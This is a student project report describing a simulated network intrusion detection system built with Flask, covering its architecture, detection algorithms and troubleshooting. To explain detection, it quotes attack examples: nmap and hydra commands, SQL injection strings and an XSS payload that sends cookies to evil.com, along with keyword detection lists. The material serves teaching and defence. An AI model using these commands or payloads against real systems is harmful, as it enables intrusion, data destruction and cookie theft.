# Network Intrusion Detection System (NIDS)
### Mini Project Report
**Students:** Harsh Soam | Abhishek Arya  
**Teacher:** Mr. Varun Chaudhary  
**Subject:** Computer Networks / Cyber Security

---

## Table of Contents
1. [Project Overview](#1-project-overview)
2. [What is a NIDS?](#2-what-is-a-nids)
3. [Project Architecture](#3-project-architecture)
4. [File Structure](#4-file-structure)
5. [How to Run](#5-how-to-run)
6. [Attack Detection Methods](#6-attack-detection-methods)
7. [Code Explanation (Deep Dive)](#7-code-explanation-deep-dive)
8. [Common Issues & Fixes](#8-common-issues--fixes)
9. [Learning Outcomes](#9-learning-outcomes)

---

## 1. Project Overview

This project implements a **Network Intrusion Detection System (NIDS)** — a software that monitors network traffic and raises alerts when it detects suspicious or malicious patterns. It features:

- **7 Attack Detection Algorithms**
- **Real-time Web Dashboard** (live charts, alerts feed)
- **Attack Simulator** (trigger attacks manually)
- **Auto IP Blocking** for critical threats
- **Deep explanations in every file**

---

## 2. What is a NIDS?

A **Network Intrusion Detection System** is a security application that:

```
Network Traffic → NIDS Engine → Alert if Attack Detected
```

### Two Types of IDS:

| Type | How it Works | Pros | Cons |
|------|-------------|------|------|
| **Signature-Based** | Compare traffic against known attack patterns | Fast, low false positives | Can't detect NEW attacks (zero-days) |
| **Anomaly-Based** | Learn "normal" traffic, flag deviations | Detects zero-days | More false positives |

**Our NIDS uses Signature-Based detection** — simpler and more educational.

### Real-World NIDS Tools:
- **Snort** — most popular open-source NIDS
- **Suricata** — high-performance multi-threaded NIDS  
- **Zeek** — network analysis framework
- **OSSEC** — host-based IDS (HIDS)

---

## 3. Project Architecture

```
┌──────────────────────────────────────────────────┐
│              USER'S BROWSER                       │
│    Dashboard (charts, alerts, controls)           │
└──────────────────┬────────────────────────────────┘
                   │ HTTP requests every 2 sec
                   │ (AJAX polling)
┌──────────────────▼────────────────────────────────┐
│              FLASK WEB SERVER  (app.py)            │
│    /api/stats  /api/alerts  /api/simulate          │
└──────────────────┬────────────────────────────────┘
                   │
        ┌──────────┴──────────┐
        │                     │
┌───────▼────────┐   ┌────────▼──────────┐
│  Traffic        │   │  Intrusion         │
│  Simulator      │   │  Detector          │
│  (simulator.py) │   │  (detector.py)     │
│                 │──►│                   │
│  Generates fake │   │  7 Detection       │
│  network pkts  │   │  Algorithms        │
└────────────────┘   └───────────────────┘
                               │
                      ┌────────▼──────────┐
                      │  Signatures DB     │
                      │  (signatures.py)   │
                      │  Known attack      │
                      │  patterns          │
                      └───────────────────┘
```

### Data Flow:
1. `TrafficSimulator` generates packets (normal + attack)
2. `IntrusionDetector.analyze_packet()` checks each packet
3. Detection algorithms match against `ATTACK_SIGNATURES`
4. `Alert` objects are created for detected threats
5. Flask API serves alerts to the dashboard
6. Dashboard JavaScript polls APIs every 2 seconds
7. Chart.js renders real-time visualizations

---

## 4. File Structure

```
NIDS_Project/
│
├── app.py                  ← Flask web server + API endpoints
├── detector.py             ← Core detection engine (7 algorithms)
├── traffic_simulator.py    ← Generates realistic network traffic
├── signatures.py           ← Attack patterns database
├── run_nids.py             ← Easy startup script
├── requirements.txt        ← Python dependencies (just Flask)
│
└── templates/
    └── index.html          ← Dashboard UI (HTML + CSS + JS)
```

---

## 5. How to Run

### Prerequisites
- Python 3.8 or higher installed
- Internet connection (for Google Fonts + Chart.js CDN)

### Steps:

**Option 1: Easy Run (Recommended)**
```bash
# Navigate to project folder
cd NIDS_Project

# Run the startup script
python run_nids.py
```

**Option 2: Manual Run**
```bash
# Step 1: Install Flask
pip install flask

# Step 2: Start the app
python app.py

# Step 3: Open browser
# Go to: http://localhost:5000
```

### Expected Output:
```
============================================================
  NETWORK INTRUSION DETECTION SYSTEM (NIDS)
  Students : Harsh Soam | Abhishek Arya
  Teacher  : Mr. Varun Chaudhary
============================================================
[DETECTOR] Intrusion Detection Engine initialized
[DETECTOR] Loaded 7 attack signatures
[SIMULATOR] Traffic simulation STARTED
[NIDS] Background processing started...
[INFO] Dashboard available at: http://localhost:5000
```

---

## 6. Attack Detection Methods

### 🔍 Port Scan Detection

**What is it?**
An attacker uses tools like `nmap` to probe all ports on a target server, identifying running services.

**Real command attackers use:**
```bash
nmap -sS -p 1-65535 192.168.1.10
```

**How we detect it:**
```
Track: {src_ip → set of ports accessed}
If len(unique_ports) > 10 in 5 seconds → PORT SCAN ALERT!
```

**Prevention:** Firewalls, port knocking, honeypots

---

### 🌊 SYN Flood (DoS)

**What is it?**
Attacker exploits TCP 3-way handshake by sending SYN but never completing with ACK, exhausting server memory.

```
Normal:  Client→ SYN → Server → SYN-ACK → Client → ACK ✓
Attack:  Attacker→ SYN → Server → SYN-ACK → (never) ✗✗✗ (×1000)
```

**How we detect it:**
```
Track: {src_ip → count of SYN packets per second}
If SYN_count > 100 in 1 second → SYN FLOOD ALERT!
```

**Prevention:** SYN cookies, rate limiting, TCP state tracking

---

### 💉 SQL Injection

**What is it?**
Attacker inserts SQL code into input fields to manipulate the database.

**Real attack examples:**
```sql
' OR '1'='1        → Bypass login
'; DROP TABLE users; --  → Delete database!
UNION SELECT password FROM users  → Steal data
```

**How we detect it:**
```
Check HTTP payload for SQL keywords:
"SELECT *", "DROP TABLE", "UNION SELECT", "OR 1=1", etc.
(Case-insensitive matching)
```

**Prevention:** Parameterized queries, input validation, WAF

---

### 🔨 Brute Force Login

**What is it?**
Attacker uses automated tools (Hydra, Medusa) to try thousands of username/password combinations.

**Real command:**
```bash
hydra -l admin -P rockyou.txt ssh://192.168.1.10
```

**How we detect it:**
```
Track: {src_ip → connection attempts to port 22/21/3389}
If attempts > 5 in 30 seconds → BRUTE FORCE ALERT!
```

**Prevention:** Multi-factor auth, account lockout, fail2ban

---

### 📡 ICMP Flood (Ping of Death)

**What is it?**
Attacker sends massive pings to overwhelm target's network bandwidth.

**How we detect it:**
```
Track: {src_ip → ICMP packet count per second}
If count > 50 per second → ICMP FLOOD ALERT!
Also check: packet size > 1500 bytes → Ping of Death
```

**Prevention:** Block ICMP at firewall, rate limiting

---

### ⚡ Cross-Site Scripting (XSS)

**What is it?**
Attacker injects JavaScript into web forms. Victims' browsers execute the malicious script.

**Real attacks:**
```html
<script>document.location='http://evil.com?c='+document.cookie</script>
<img src=x onerror=alert(document.cookie)>
```

**How we detect it:**
```
Check HTTP payloads for: <script>, javascript:, onerror=,
document.cookie, eval(, <iframe, alert(, onload=
```

**Prevention:** Input sanitization, Content Security Policy, output encoding

---

## 7. Code Explanation (Deep Dive)

### Key Algorithms Used

#### 1. Sliding Window Algorithm (detector.py)
```python
# deque with maxlen = automatic sliding window!
self.port_scan_tracker = defaultdict(lambda: deque(maxlen=200))

# Check only events within last N seconds
recent_accesses = [
    (t, p) for t, p in self.port_scan_tracker[src_ip]
    if current_time - t <= time_window  # THE WINDOW
]
```
**Why deque?** When maxlen is reached, oldest items drop automatically — perfect for time windows!

#### 2. Pattern Matching (SQL Injection / XSS)
```python
payload_upper = packet.payload.upper()  # Normalize case
for pattern in patterns:
    if pattern.upper() in payload_upper:  # String search
        return Alert(...)
```
**Time Complexity:** O(P × L) where P = patterns count, L = payload length

#### 3. Thread Safety with Locks
```python
# Problem: Two threads writing to same list simultaneously → crash!
# Solution: Lock ensures only ONE thread can access at a time
self.alerts_lock = threading.Lock()

with self.alerts_lock:  # Thread A waits if Thread B has lock
    self.alerts.append(alert)
```

#### 4. Alert Cooldown (Prevents Alert Fatigue)
```python
# Don't raise same alert for same IP more than once per 8 seconds
def _is_in_cooldown(self, src_ip, attack_type):
    key = (src_ip, attack_type)
    last_time = self.alert_cooldown.get(key, 0)
    return time.time() - last_time < self.cooldown_period
```

#### 5. Weighted Random Traffic Generation
```python
# Each scenario has a "weight" = relative probability
scenarios = [normal_http, port_scan, syn_flood, ...]
weights =   [30,          15,        5,         ...]

chosen = random.choices(scenarios, weights=weights, k=1)[0]
# Normal traffic 30x more likely than SYN flood (realistic!)
```

---

## 8. Common Issues & Fixes

### Issue 1: "ModuleNotFoundError: No module named 'flask'"
```
❌ Error: ModuleNotFoundError: No module named 'flask'

✅ Fix: pip install flask
   Or: python -m pip install flask
```

### Issue 2: "Address already in use" (port 5000 busy)
```
❌ Error: OSError: [Errno 98] Address already in use

✅ Fix Option A: Kill the process using port 5000
   Windows: netstat -ano | findstr :5000
            taskkill /PID <pid> /F

✅ Fix Option B: Change port in app.py
   app.run(port=5001)  ← change 5000 to 5001
   Then visit http://localhost:5001
```

### Issue 3: Dashboard shows no data
```
❌ Problem: Charts are empty, no alerts showing

✅ Fix: Check that run_nids.py (not app.py) was started
   The simulator won't start if imported incorrectly.
   Run: python run_nids.py
```

### Issue 4: Unicode error on Windows
```
❌ Error: UnicodeEncodeError: 'charmap' codec can't encode character

✅ Fix: Set environment variable before running:
   Windows PowerShell: $env:PYTHONIOENCODING = "utf-8"
   Windows CMD: set PYTHONIOENCODING=utf-8
```

### Issue 5: Browser shows "Connection refused"
```
❌ Problem: http://localhost:5000 won't load

✅ Fix: Make sure the Python script is still running.
   Check terminal — if it shows errors, fix them first.
   Try http://127.0.0.1:5000 instead.
```

---

## 9. Learning Outcomes

After completing this project, students will understand:

### Networking Concepts:
- TCP/IP protocol stack and packet structure
- TCP 3-way handshake (SYN, SYN-ACK, ACK)
- Port numbers and their significance
- Network protocols: TCP, UDP, HTTP, ICMP, DNS

### Security Concepts:
- Types of network attacks (DoS, injection, scanning)
- Signature-based vs anomaly-based detection
- Alert fatigue and why cooldowns matter
- IP spoofing and why source IPs can be fake
- Defense-in-depth security strategy

### Programming Concepts:
- Python threading and thread safety
- Sliding window algorithm
- Pattern matching and string search
- Client-server architecture (Flask)
- REST API design and JSON
- AJAX polling for real-time updates
- Chart.js data visualization

### Software Engineering:
- Modular code architecture (separation of concerns)
- `defaultdict` and `deque` for efficient data structures
- Observer pattern (detector observes traffic)
- Design patterns in security software

---

## Glossary

| Term | Meaning |
|------|---------|
| NIDS | Network Intrusion Detection System |
| IDS | Intrusion Detection System |
| DoS | Denial of Service attack |
| DDoS | Distributed Denial of Service |
| SYN | TCP synchronize flag (connection initiation) |
| ACK | TCP acknowledge flag |
| SQL | Structured Query Language (database language) |
| XSS | Cross-Site Scripting |
| ICMP | Internet Control Message Protocol (ping uses this) |
| MTU | Maximum Transmission Unit (max packet size = 1500 bytes) |
| Port | Virtual "door number" on a computer (0-65535) |
| API | Application Programming Interface |
| AJAX | Asynchronous JavaScript and XML (real-time web updates) |
| JSON | JavaScript Object Notation (data format) |

---

*Project built with Python 3 + Flask + Chart.js | June 2026*
